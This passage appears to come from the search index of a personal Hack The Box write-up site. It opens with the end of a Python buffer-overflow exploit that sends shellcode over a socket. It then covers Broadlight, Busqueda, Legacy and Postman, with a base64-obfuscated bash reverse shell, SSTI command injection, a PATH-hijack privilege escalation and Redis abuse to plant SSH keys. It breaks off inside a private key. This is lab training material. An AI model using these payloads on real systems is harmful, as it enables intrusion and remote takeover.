b\"\\x5c\\xe7\\xb9\\xc5\\x96\\x93\\x3b\\x0f\\xe7\\x5c\\x97\\x6e\"\nbuf += b\"\\xc7\\xae\\xe9\\xb7\\xe0\\x50\\x9c\\xc1\\x12\\xec\\xa7\\x16\"\nbuf += b\"\\x68\\x2a\\x2d\\x8c\\xca\\xb9\\x95\\x68\\xea\\x6e\\x43\\xfb\"\nbuf += b\"\\xe0\\xdb\\x07\\xa3\\xe4\\xda\\xc4\\xd8\\x11\\x56\\xeb\\x0e\"\nbuf += b\"\\x90\\x2c\\xc8\\x8a\\xf8\\xf7\\x71\\x8b\\xa4\\x56\\x8d\\xcb\"\nbuf += b\"\\x06\\x06\\x2b\\x80\\xab\\x53\\x46\\xcb\\xa3\\x90\\x6b\\xf3\"\nbuf += b\"\\x33\\xbf\\xfc\\x80\\x01\\x60\\x57\\x0e\\x2a\\xe9\\x71\\xc9\"\nbuf += b\"\\x4d\\xc0\\xc6\\x45\\xb0\\xeb\\x36\\x4c\\x77\\xbf\\x66\\xe6\"\nbuf += b\"\\x5e\\xc0\\xec\\xf6\\x5f\\x15\\xa2\\xa6\\xcf\\xc6\\x03\\x16\"\nbuf += b\"\\xb0\\xb6\\xeb\\x7c\\x3f\\xe8\\x0c\\x7f\\x95\\x81\\xa7\\x7a\"\nbuf += b\"\\x7e\\xa4\\x3d\\x94\\x7d\\xd0\\x43\\x94\\xa2\\x0c\\xcd\\x72\"\nbuf += b\"\\xce\\x5c\\x9b\\x2d\\x67\\xc4\\x86\\xa5\\x16\\x09\\x1d\\xc0\"\nbuf += b\"\\x19\\x81\\x92\\x35\\xd7\\x62\\xde\\x25\\x80\\x82\\x95\\x17\"\nbuf += b\"\\x07\\x9c\\x03\\x3f\\xcb\\x0f\\xc8\\xbf\\x82\\x33\\x47\\xe8\"\nbuf += b\"\\xc3\\x82\\x9e\\x7c\\xfe\\xbd\\x08\\x62\\x03\\x5b\\x72\\x26\"\nbuf += b\"\\xd8\\x98\\x7d\\xa7\\xad\\xa5\\x59\\xb7\\x6b\\x25\\xe6\\xe3\"\nbuf += b\"\\x23\\x70\\xb0\\x5d\\x82\\x2a\\x72\\x37\\x5c\\x80\\xdc\\xdf\"\nbuf += b\"\\x19\\xea\\xde\\x99\\x25\\x27\\xa9\\x45\\x97\\x9e\\xec\\x7a\"\nbuf += b\"\\x18\\x77\\xf9\\x03\\x44\\xe7\\x06\\xde\\xcc\\x17\\x4d\\x42\"\nbuf += b\"\\x64\\xb0\\x08\\x17\\x34\\xdd\\xaa\\xc2\\x7b\\xd8\\x28\\xe6\"\nbuf += b\"\\x03\\x1f\\x30\\x83\\x06\\x5b\\xf6\\x78\\x7b\\xf4\\x93\\x7e\"\nbuf += b\"\\x28\\xf5\\xb1\"\npayload=buf\noverrun    = b\"C\" * (1500 - len(padding1 + NOPS + EIP + payload))\n\nbuf = padding1 + EIP + NOPS + payload + overrun\n\ntry:\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target,8888))\n    s.send(buf)\nexcept Exception as e:\n    print(sys.exc_value)\n</code></pre>"},{"location":"HTB/easy/box1/","title":"Box1","text":""},{"location":"HTB/easy/box1/#easy-machine-name","title":"Easy machine name","text":"<p>This isthe easy machine</p>"},{"location":"HTB/easy/broadlight/","title":"Broadlight","text":""},{"location":"HTB/easy/broadlight/#nmap-enumeration","title":"Nmap Enumeration","text":"<p><pre><code>sudo nmap -sVC -A -O 10.129.231.37\n</code></pre> </p>"},{"location":"HTB/easy/broadlight/#website","title":"Website","text":"<p>After visiting adding the <code>board.htb</code> to the <code>/etc/hosts</code> file we can visit the site. </p> <p>After visiting the the about and contact us pages we can see that the site is using <code>php</code>.</p>"},{"location":"HTB/easy/broadlight/#directory-brutfocing","title":"Directory Brutfocing","text":"<p>Let's use the <code>feroxbuster</code> and use the -X <code>php</code> since we know the site is using the <code>php</code>. <pre><code>feroxbuster -u http://board.htb\n</code></pre>  There is nothing new we already know most of these so let's move to the next step of enumeration.</p>"},{"location":"HTB/easy/broadlight/#subdomina-brutfocing","title":"Subdomina brutfocing","text":"<p>We can use the <code>ffuf</code> for this to brutfoce the subdoamins and add them to the <code>/etc/hosts</code> file. <pre><code>ffuf -u http://board.htb -H \"Host: FUZZ.board.htb\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc all -ac\n</code></pre> We can see that the crm sbudomain is giving us a <code>200</code> status code. </p> <p>We can addd it to the <code>/etc/hosts</code> file. </p>"},{"location":"HTB/easy/broadlight/#crmboardhtb","title":"crm.board.htb","text":"<p>let's visit the subdomain. </p> <p>We can see that the cms is <code>Dolibarr 17.0.0</code>. This verion is vulnerable to the CVE <code>CVE-2023-30253</code>. ![https://www.swascan.com/security-advisory-dolibarr-17-0-0/]</p> <p>We can use the default credentails to login to the cms but we don't have much previlages.</p> <p><pre><code>username: admin\npassword: admin\n</code></pre> </p>"},{"location":"HTB/easy/busqueda/","title":"Busqueda","text":"<pre><code>nmap -sVC -oA scan.txt $ip\n</code></pre>"},{"location":"HTB/easy/busqueda/#nmap-result","title":"Nmap Result","text":"<p>From the <code>nmap</code> result we can see that the two ports <code>22</code> for <code>ssh</code> and port <code>80 http</code> are open.  Port <code>80</code> try to redirect use to <code>http://searcher.htb/</code> lets add this to <code>/etc/hosts/</code> Afer adding the <code>search.htb</code> to the host file we can see the wepage.  but the header on the nmap shows Apache with the ip but when we run the <code>curl</code> with the <code>ip</code> and on <code>searcher.htb</code> we get two different server header. see the highlighted lines below.</p> <pre><code>\u279c busqueda$ curl -v -s 10.129.228.217 1&gt; /dev/null\n*   Trying 10.129.228.217:80...\n* Connected to 10.129.228.217 (10.129.228.217) port 80\n* using HTTP/1.x\n&gt; GET / HTTP/1.1\n&gt; Host: 10.129.228.217\n&gt; User-Agent: curl/8.11.1\n&gt; Accept: */*\n&gt; \n* Request completely sent off\n&lt; HTTP/1.1 302 Found\n&lt; Date: Fri, 07 Feb 2025 04:03:07 GMT\n&lt; Server: Apache/2.4.52 (Ubuntu)\n&lt; Location: http://searcher.htb/\n&lt; Content-Length: 284\n&lt; Content-Type: text/html; charset=iso-8859-1\n&lt; \n{ [284 bytes data]\n* Connection #0 to host 10.129.228.217 left intact\n\u279c  busqueda$ curl -v -s searcher.htb 1&gt; /dev/null\n* Host searcher.htb:80 was resolved.\n* IPv6: (none)\n* IPv4: 10.129.228.217\n*   Trying 10.129.228.217:80...\n* Connected to searcher.htb (10.129.228.217) port 80\n* using HTTP/1.x\n&gt; GET / HTTP/1.1\n&gt; Host: searcher.htb\n&gt; User-Agent: curl/8.11.1\n&gt; Accept: */*\n&gt; \n* Request completely sent off\n&lt; HTTP/1.1 200 OK\n&lt; Date: Fri, 07 Feb 2025 04:03:51 GMT\n  Server: Werkzeug/2.1.2 Python/3.10.6\n&lt; Content-Type: text/html; charset=utf-8\n&lt; Content-Length: 13519\n&lt; Vary: Accept-Encoding\n&lt; \n{ [1146 bytes data]\n* Connection #0 to host searcher.htb left intact\n</code></pre> <p>After going through the burbsuit and testing some Server Site Templete Injection SSTI we came to find the right chars that will spit out system info. see below screenshot for the burbsuit </p> <p>let's get a reverse shell. <pre><code>echo -n \"bash -c 'bash -i  &gt;&amp; /dev/tcp/10.10.16.10/9001 0&gt;&amp;1'  \" |  base64\n</code></pre> used spaces to remove the spcial charechters (+ and ==) <code>YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAvOTAwMSAwPiYxJyAg</code></p>"},{"location":"HTB/easy/busqueda/#breakdown","title":"Breakdown:","text":"<ol> <li> <p><code>echo -n \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.10/9001 0&gt;&amp;1' \"</code></p> <ul> <li>This creates a reverse shell command using <code>bash</code>.</li> <li><code>bash -i</code>: Starts an interactive Bash shell.</li> <li><code>&gt;&amp; /dev/tcp/10.10.16.10/9001 0&gt;&amp;1</code>: Redirects standard input/output to the attacker's IP (<code>10.10.16.10</code>) on port <code>9001</code>, establishing a reverse shell.</li> <li> <p><code>| base64</code></p> </li> <li> <p>Encodes the entire command in Base64 format, making it less suspicious when injected into a vulnerable application.</p> </li> </ul> </li> </ol>"},{"location":"HTB/easy/busqueda/#purpose","title":"Purpose:","text":"<ul> <li>The Base64 encoding is typically used to bypass security filters, evade detection, or deliver payloads in an obfuscated way.</li> <li>Once sent to the target system, it can be decoded and executed to establish a reverse shell.</li> </ul>"},{"location":"HTB/easy/busqueda/#decoding-and-executing","title":"Decoding and Executing:","text":"<p>On the target machine, the attacker can decode and execute it like this:</p> <p>bash</p> <p>CopyEdit</p> <p><code>echo \"BASE64_ENCODED_STRING\" | base64 -d | bash</code></p> <p>This will decode the Base64 string back into the original Bash reverse shell command and execute it, giving an attacker remote access.</p>"},{"location":"HTB/easy/busqueda/#geting-the-reverse-shell-using-the-base64-encoded-string-we-crated","title":"Geting the reverse shell using the base64 encoded string we crated.","text":"<p>string the listener on the kali  <pre><code>nc -lvnp 9001\n</code></pre></p>"},{"location":"HTB/easy/busqueda/#run-on-the-burbsuit-repeater","title":"Run on the burbsuit repeater","text":"<p>This will be placed insdie the import('os').system('id') in the bubsuit repeater <pre><code>__import__('os').system('echo -n YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAvOTAwMSAwPiYxJyAg | base64 -d | bash')\n</code></pre> After running the command above we get a reverse shell on our listener </p> <p>Spaces are repladed with urlEconded <code>%20</code> and added <code>#</code> at the end urlEncoded <code>%20%23%20</code></p> <p>After gettign the shell we look through and nothing interesting until we run to see which ports or application are listening.  <pre><code>svc@busqueda:/var/www/app/templates$ ss -lntp\nss -lntp\nState  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                     \nLISTEN 0      128        127.0.0.1:5000       0.0.0.0:*    users:((\"python3\",pid=1578,fd=6),(\"python3\",pid=1578,fd=4))\nLISTEN 0      4096       127.0.0.1:3306       0.0.0.0:*\nLISTEN 0      4096       127.0.0.1:40365      0.0.0.0:*\nLISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*\nLISTEN 0      128          0.0.0.0:22         0.0.0.0:*\nLISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*\nLISTEN 0      4096       127.0.0.1:222        0.0.0.0:*\nLISTEN 0      511                *:80               *:*\nLISTEN 0      128             [::]:22            [::]:*  \n</code></pre> the port <code>3306</code> , <code>5000</code>, and <code>3000</code> lets check the  <code>mysql</code> conf file for the <code>3306</code></p> <p>We know there's apache2 we can head to the <code>/etc/apache2/siges-enabled/000-default.conf</code></p> <p><pre><code>svc@busqueda:/etc/apache2/sites-enabled$ cat 000-default.conf\ncat 000-default.conf\n&lt;VirtualHost *:80&gt;\n        ProxyPreserveHost On\n        ServerName searcher.htb\n        ServerAdmin admin@searcher.htb\n        ProxyPass / http://127.0.0.1:5000/\n        ProxyPassReverse / http://127.0.0.1:5000/\n\n        RewriteEngine On\n        RewriteCond %{HTTP_HOST} !^searcher.htb$\n        RewriteRule /.* http://searcher.htb/ [R]\n\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n&lt;/VirtualHost&gt;\n\n&lt;VirtualHost *:80&gt;\n        ProxyPreserveHost On\n        ServerName gitea.searcher.htb\n        ServerAdmin admin@searcher.htb\n        ProxyPass / http://127.0.0.1:3000/\n        ProxyPassReverse / http://127.0.0.1:3000/\n\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n&lt;/VirtualHost&gt;\n\n# vim: syntax=apache ts=4 sw=4 sts=4 sr noet\n</code></pre> We can add the <code>gitea.searcher.htb</code> to the <code>/etc/hosts</code> file and visit the site.</p> <p>After navigating through the files in the <code>/var/www/app/.git</code> dir we find a <code>confi</code> file that has user and password. see below.  we can use this user and password <code>jh1usoih2bkjaspwe92</code> to login into the <code>gitea.searcher.htb</code> now.</p> <p>After using the password to list what commands cody can run as a <code>sudo</code> user.</p> <p><pre><code>svc@busqueda:/var/www/app/.git$ sudo -S -l\nsudo -S -l\n[sudo] password for svc: jh1usoih2bkjaspwe92\nMatching Defaults entries for svc on busqueda:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser svc may run the following commands on busqueda:\n    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *\nsvc@busqueda:/var/www/app/.git$ \n</code></pre> we can use the <code>/usr/bin/python3 /opt/scripts/system-checkup.py</code> check what's there for us.</p> <p><pre><code>svc@busqueda:/var/www/app/.git$ sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py adds\n&lt;usr/bin/python3 /opt/scripts/system-checkup.py *\nUsage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)\n\n     docker-ps     : List running docker containers\n     docker-inspect : Inpect a certain docker container\n     full-checkup  : Run a full system checkup\n</code></pre> It does take an argument at the end where the * is. After giving it a random string argument we can see that it tells us that we can run three things.</p> <ul> <li>docker-ps</li> <li>docker-inspect https://docs.docker.com/reference/cli/docker/inspect/</li> <li>full-backup</li> </ul> <p>Let's check out the <code>docker-inspect</code> with <code>{{json .Config}} 9608</code> so it give the output in json format. </p> <p>copy the json data so we can format it and go throug it. <pre><code>echo -n \"json data\" | jq .\n</code></pre></p>"},{"location":"HTB/easy/busqueda/#output","title":"Output","text":"<p><pre><code>\u279c  busqueda$ echo -n '{\"Hostname\":\"960873171e2e\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"22/tcp\":{},\"3000/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"USER_UID=115\",\"USER_GID=121\",\"GITEA__database__DB_TYPE=mysql\",\"GITEA__database__HOST=db:3306\",\"GITEA__database__NAME=gitea\",\"GITEA__database__USER=gitea\",\"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\",\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"USER=git\",\"GITEA_CUSTOM=/data/gitea\"],\"Cmd\":[\"/bin/s6-svscan\",\"/etc/s6\"],\"Image\":\"gitea/gitea:latest\",\"Volumes\":{\"/data\":{},\"/etc/localtime\":{},\"/etc/timezone\":{}},\"WorkingDir\":\"\",\"Entrypoint\":[\"/usr/bin/entrypoint\"],\"OnBuild\":null,\"Labels\":{\"com.docker.compose.config-hash\":\"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515\",\"com.docker.compose.container-number\":\"1\",\"com.docker.compose.oneoff\":\"False\",\"com.docker.compose.project\":\"docker\",\"com.docker.compose.project.config_files\":\"docker-compose.yml\",\"com.docker.compose.project.working_dir\":\"/root/scripts/docker\",\"com.docker.compose.service\":\"server\",\"com.docker.compose.version\":\"1.29.2\",\"maintainer\":\"maintainers@gitea.io\",\"org.opencontainers.image.created\":\"2022-11-24T13:22:00Z\",\"org.opencontainers.image.revision\":\"9bccc60cf51f3b4070f5506b042a3d9a1442c73d\",\"org.opencontainers.image.source\":\"https://github.com/go-gitea/gitea.git\",\"org.opencontainers.image.url\":\"https://github.com/go-gitea/gitea\"}}' | jq .\n\n{\n  \"Hostname\": \"960873171e2e\",\n  \"Domainname\": \"\",\n  \"User\": \"\",\n  \"AttachStdin\": false,\n  \"AttachStdout\": false,\n  \"AttachStderr\": false,\n  \"ExposedPorts\": {\n    \"22/tcp\": {},\n    \"3000/tcp\": {}\n  },\n  \"Tty\": false,\n  \"OpenStdin\": false,\n  \"StdinOnce\": false,\n  \"Env\": [\n    \"USER_UID=115\",\n    \"USER_GID=121\",\n    \"GITEA__database__DB_TYPE=mysql\",\n    \"GITEA__database__HOST=db:3306\",\n    \"GITEA__database__NAME=gitea\",\n    \"GITEA__database__USER=gitea\",\n    \"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\",\n    \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\n    \"USER=git\",\n    \"GITEA_CUSTOM=/data/gitea\"\n  ],\n  \"Cmd\": [\n    \"/bin/s6-svscan\",\n    \"/etc/s6\"\n  ],\n  \"Image\": \"gitea/gitea:latest\",\n  \"Volumes\": {\n    \"/data\": {},\n    \"/etc/localtime\": {},\n    \"/etc/timezone\": {}\n  },\n  \"WorkingDir\": \"\",\n  \"Entrypoint\": [\n    \"/usr/bin/entrypoint\"\n  ],\n  \"OnBuild\": null,\n  \"Labels\": {\n    \"com.docker.compose.config-hash\": \"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515\",\n    \"com.docker.compose.container-number\": \"1\",\n    \"com.docker.compose.oneoff\": \"False\",\n    \"com.docker.compose.project\": \"docker\",\n    \"com.docker.compose.project.config_files\": \"docker-compose.yml\",\n    \"com.docker.compose.project.working_dir\": \"/root/scripts/docker\",\n    \"com.docker.compose.service\": \"server\",\n    \"com.docker.compose.version\": \"1.29.2\",\n    \"maintainer\": \"maintainers@gitea.io\",\n    \"org.opencontainers.image.created\": \"2022-11-24T13:22:00Z\",\n    \"org.opencontainers.image.revision\": \"9bccc60cf51f3b4070f5506b042a3d9a1442c73d\",\n    \"org.opencontainers.image.source\": \"https://github.com/go-gitea/gitea.git\",\n    \"org.opencontainers.image.url\": \"https://github.com/go-gitea/gitea\"\n  }\n}\n</code></pre> As we can go throug the json text at the <code>ENV</code> we see passwrod (highlighted) for the mysql we can use it to login. we can also test it on other users if we want to.  If we use this password for the <code>administrator:yuiu1hoiu4i5ho1uh</code> on the <code>gitea.searcher.htb</code> we can login successfully.</p> <p>Now we can see all the source code. </p> <p>After gong the scripts one of the scripts <code>system-check.sh</code> I find the line where we can run a full check shell. see the hightlight line in the code below.</p> <pre><code>#!/bin/bash\nimport subprocess\nimport sys\n\nactions = ['full-checkup', 'docker-ps','docker-inspect']\n\ndef run_command(arg_list):\n    r = subprocess.run(arg_list, capture_output=True)\n    if r.stderr:\n        output = r.stderr.decode()\n    else:\n        output = r.stdout.decode()\n\n    return output\n\n\ndef process_action(action):\n    if action == 'docker-inspect':\n        try:\n            _format = sys.argv[2]\n            if len(_format) == 0:\n                print(f\"Format can't be empty\")\n                exit(1)\n            container = sys.argv[3]\n            arg_list = ['docker', 'inspect', '--format', _format, container]\n            print(run_command(arg_list)) \n\n        except IndexError:\n            print(f\"Usage: {sys.argv[0]} docker-inspect &lt;format&gt; &lt;container_name&gt;\")\n            exit(1)\n\n        except Exception as e:\n            print('Something went wrong')\n            exit(1)\n\n    elif action == 'docker-ps':\n        try:\n            arg_list = ['docker', 'ps']\n            print(run_command(arg_list)) \n\n        except:\n            print('Something went wrong')\n            exit(1)\n\n    elif action == 'full-checkup':\n        try:\n            arg_list = ['./full-checkup.sh']\n            print(run_command(arg_list))\n            print('[+] Done!')\n        except:\n            print('Something went wrong')\n            exit(1)\n\n\nif __name__ == '__main__':\n\n    try:\n        action = sys.argv[1]\n        if action in actions:\n            process_action(action)\n        else:\n            raise IndexError\n\n    except IndexError:\n        print(f'Usage: {sys.argv[0]} &lt;action&gt; (arg1) (arg2)')\n        print('')\n        print('     docker-ps     : List running docker containers')\n        print('     docker-inspect : Inpect a certain docker container')\n        print('     full-checkup  : Run a full system checkup')\n        print('')\n        exit(1)\n</code></pre> <p>The higlighted line <code>./full-checkup.sh</code> is not using a full path so if we run this on directory that we have write access to, it will run a full-check up. so let's create a reverse shell and test to get a reverse shell.</p>"},{"location":"HTB/easy/busqueda/#reverseshell","title":"ReverseShell","text":"<p>Navigate to <code>/dev/shm</code> create a file <code>full-checkup.sh</code> <pre><code>cd /dev/shm\nnano full-checkup.sh\n\n#inside the file write a reverse shell\n\n#!/bin/bash\nbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.10/9001 0&gt;&amp;1'\n\n#Change it to executabel\nchmod +x full-checkup.sh\n</code></pre> After we can do a <code>sudo -l</code> and provide the password <code>jh1usoih2bkjaspwe92</code> once again to get what we can run as a sudo. use the <code>full-checkup</code> that we created as an argument and make sue we are listening on the port <code>9001</code> with <code>nc -lvnp 9001</code> then run the command below to get a <code>root</code> access. <pre><code>vc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n</code></pre> <pre><code>root@busqueda:/home/svc# cat user.txt\ncat user.txt\n2705ce3e3007484fff84e92a45fe4bf9\nroot@busqueda:/home/svc# cd /root/root.txt\ncd /root/root.txt\nbash: cd: /root/root.txt: Not a directory\nroot@busqueda:/home/svc# cd /root\ncd /root\nroot@busqueda:~# cat root.txt\ncat root.txt\n233779a86876f5fce44ced15c27a77dd\nroot@busqueda:~# \n</code></pre></p>"},{"location":"HTB/easy/legacy/","title":"Legacy","text":""},{"location":"HTB/easy/legacy/#nmap","title":"nmap","text":"<p><pre><code>sudo -sC -sV -oN 10.129.227.181\nsudo -sC -sV --script=vuln &lt;IP&gt;\n</code></pre> </p> <ul> <li>135 RPC</li> <li>139 Netbios</li> <li>445 SMB</li> </ul>"},{"location":"HTB/easy/legacy/#metasploit","title":"Metasploit","text":"<p>The easiest way to get root this machine is using the metasploit which will give the root access (system32) </p> <p>after setting the RHOST and LHOST we can run the exploit. </p> <p>Access the user.txt and root.txt flags for summisions </p>"},{"location":"HTB/easy/postman/","title":"Postman","text":""},{"location":"HTB/easy/postman/#enumeration","title":"Enumeration","text":"<p><pre><code>nmap -sC -sV -o scan.txt 10.129.2.1\n</code></pre> </p>"},{"location":"HTB/easy/postman/#ports","title":"Ports","text":"<ul> <li>port 80 </li> <li>port 22 ubuntu</li> <li>port 10000 Miniserv</li> </ul>"},{"location":"HTB/easy/postman/#full-nmap-scan","title":"Full Nmap Scan","text":"<p>The full scan <code>-p</code> finds another port. - 6379/tcp open  redis   Redis key-value store 4.0.9</p> <p>After discovering ports with nmap scan and visited the port <code>80</code> http has a plain html static site not much there to note except the email address <code>Postman@htb</code>. </p> <p>Port <code>10000</code> is running <code>MiniServ</code> hosting a <code>webmin</code> login page and a hostname leake for <code>https://postman:10000</code>. no results on the <code>Searchsploit</code> Add it to the /etc/host file</p> <p></p>"},{"location":"HTB/easy/postman/#gobuster","title":"Gobuster","text":"<p>The /upload directory has images but the one that stands out is the <code>Cyber-security-web-banner.jpg</code>. downloaded the image via <code>wget</code> and extracted the <code>metadata</code> </p> <p><pre><code>\u279c  postman exiftool Cyber-security-web-banner.jpg \nExifTool Version Number         : 13.10\nFile Name                       : Cyber-security-web-banner.jpg\nDirectory                       : .\nFile Size                       : 590 kB\nFile Modification Date/Time     : 2018:04:20 07:09:25-04:00\nFile Access Date/Time           : 2025:02:11 23:58:13-05:00\nFile Inode Change Date/Time     : 2025:02:11 23:58:13-05:00\nFile Permissions                : -rw-rw-r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : None\nX Resolution                    : 1\nY Resolution                    : 1\nComment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 95.\nImage Width                     : 1920\nImage Height                    : 865\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 1920x865\nMegapixels                      : 1.7\n</code></pre> This image was almost created the same time as the <code>index.html</code> which is interesting and good to note the date on these. </p> <pre><code> postman exiftool index.html                    \nExifTool Version Number         : 13.10\nFile Name                       : index.html\nDirectory                       : .\nFile Size                       : 3.8 kB\nFile Modification Date/Time     : 2019:08:25 14:34:23-04:00\nFile Access Date/Time           : 2025:02:12 00:08:30-05:00\nFile Inode Change Date/Time     : 2025:02:12 00:08:30-05:00\nFile Permissions                : -rw-rw-r--\nFile Type                       : HTML\nFile Type Extension             : html\nMIME Type                       : text/html\n</code></pre>"},{"location":"HTB/easy/postman/#redis-port-6379","title":"Redis port 6379","text":"<pre><code>nc -v &lt;ip&gt; 6379\n</code></pre>"},{"location":"HTB/easy/postman/#googled-the-redis-comands","title":"Googled the Redis comands.","text":"<ul> <li>info will print out some information the redis </li> <li><code>config_file:/etc/redis/redis.conf</code></li> <li>config get *</li> <li>will give more information</li> </ul> <p>It's a good idea to do a little search for webshell upload since there's an /upload directory.</p>"},{"location":"HTB/easy/postman/#nmap-script-scan-for-redis","title":"Nmap script scan for redis","text":"<p><pre><code>PORT     STATE SERVICE\n6379/tcp open  redis\n| redis-info: \n|   Version: 4.0.9\n|   Operating System: Linux 4.15.0-58-generic x86_64\n|   Architecture: 64 bits\n|   Process ID: 659\n|   Used CPU (sys): 4.83\n|   Used CPU (user): 2.00\n|   Connected clients: 2\n|   Connected slaves: 0\n|   Used memory: 841.96K\n|   Role: master\n|   Bind addresses: \n|     0.0.0.0\n|     ::1\n|   Client connections: \n|_    10.10.16.8\n</code></pre> The ubuntu kernal version will tell when the server was update. google the version <code>4.15.0-58-generic</code> 2019 its kina matches when the <code>index.html</code> was update.</p>"},{"location":"HTB/easy/postman/#install-redis-tools","title":"Install Redis tools","text":"<pre><code>sudo apt-get install redis-tools\n</code></pre>"},{"location":"HTB/easy/postman/#redis-cli","title":"Redis Cli","text":"<p>https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/redis</p> <pre><code>redis-cli -h &lt;ip&gt;\nredis-cli key *\nconfig set dir /var/www/html/uplaod\nconfig set dbfilename redis.php\nset test \"&lt;?php phpinfo() ?&gt;\"\nsave\n</code></pre>"},{"location":"HTB/easy/postman/#creating-ssh-key","title":"Creating ssh key","text":"<p><pre><code>ssh-keygen -t rsa -b 4096\n</code></pre> Cat the postman.pub and add two line breaks at top and two at the buttom of the key.</p> <pre><code>cat postman.pub| redis-cli -h 10.129.2.1 -x set crackit\n## Did not work\n</code></pre> <pre><code>redis-cli -h 10.129.2.1\nconfig set dir /home/test/.ssh\n## Not a directory / permission issues\n</code></pre>"},{"location":"HTB/easy/postman/#google-redis-home-dir","title":"Google redis home dir","text":"<pre><code>config set dir /var/lib/redis\nconfig set dir /var/lib/redis/.ssh\nconfig set dbfilename \"authorized_keys\"\nsave\n</code></pre>"},{"location":"HTB/easy/postman/#outpub","title":"Outpub","text":"<pre><code>10.129.2.1:6379&gt; config set dir /var/lib/redis\nOK\n10.129.2.1:6379&gt; config set dir /var/lib/redis/.ssh\nOK\n10.129.2.1:6379&gt; config set dbfilename \"authorized_keys\"\nOK\n10.129.2.1:6379&gt; save\nOK\n10.129.2.1:6379&gt; \n</code></pre>"},{"location":"HTB/easy/postman/#ssh-login","title":"SSH Login","text":"<pre><code>chmod 600 postman\nssh -i postman redis@10.129.2.1\n</code></pre>"},{"location":"HTB/easy/postman/#gained-shell","title":"Gained Shell","text":"<pre><code>ls -la\nfind . -writeble\n</code></pre>"},{"location":"HTB/easy/postman/#output","title":"Output","text":"<pre><code>redis@Postman:~$ find . writeble\n.\n./ibortfgq.so\n./.bash_history\n./.gnupg\n./.gnupg/private-keys-v1.d\n./.ssh\n./.ssh/authorized_keys\n./dkixshbr.so\n./.local\n./.local/share\n./.local/share/nano\n./vlpaulhk.so\n./.cache\n./.cache/motd.legal-displayed\n./module.o\n./6379\n./6379/dump.rdb\n./qcbxxlig.so\n./redis.php\n./dump.rdb\nfind: \u2018writeble\u2019: No such file or directory\nredis@Postman:~$ \n</code></pre>"},{"location":"HTB/easy/postman/#permission-denied","title":"Permission Denied","text":"<pre><code>redis@Postman:/$ ls\nbin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  swapfile  tmp  var      vmlinuz.old\nboot  etc  initrd.img  lib         lost+found  mnt    proc  run   srv   sys       usr  vmlinuz  webmin-setup.out\nredis@Postman:/$ cd root\n-bash: cd: root: Permission denied\nredis@Postman:/$ cd home\nredis@Postman:/home$ ls\nMatt\nredis@Postman:/home$ cd Matt/\nredis@Postman:/home/Matt$ ls\nuser.txt\nredis@Postman:/home/Matt$ cat user.txt\ncat: user.txt: Permission denied\nredis@Postman:/home/Matt$ \n</code></pre>"},{"location":"HTB/easy/postman/#linpeassh","title":"Linpeas.sh","text":"<p>Copy the linpeas.sh to the target via wget hosting the file on the kali via python3  <pre><code>python3 -m htt.server\n\n## target system cd &gt; /dev/shm\nwget http://&lt;kali-ip&gt;:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n</code></pre> </p> <p>While waiting for the linpeas to complet let's find out when was user <code>Matt</code> logged in.</p> <pre><code>find / -newermt 2019-09-10 ! -newermt 2019-09-13 -ls 2&gt;/dev/null\n</code></pre>"},{"location":"HTB/easy/postman/#output_1","title":"Output","text":"<pre><code>redis@Postman:/dev/shm$ find / -newermt 2019-09-10 ! -newermt 2019-09-13 2&gt;/dev/null\n/opt\n/home\n/home/Matt\n/home/Matt/.bash_history\n/var/log/journal/2cb57e052840450f9a54b149b131d24d/system@0005924475c9fb9b-0e787e1275733a5c.journal~\n/var/log/journal/2cb57e052840450f9a54b149b131d24d/user-1000.journal\nredis@Postman:/dev/shm$ \n</code></pre>"},{"location":"HTB/easy/postman/#ssh-to-john","title":"SSH to John","text":"<pre><code>redis@Postman:/opt$ cat id_rsa.bak \n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: 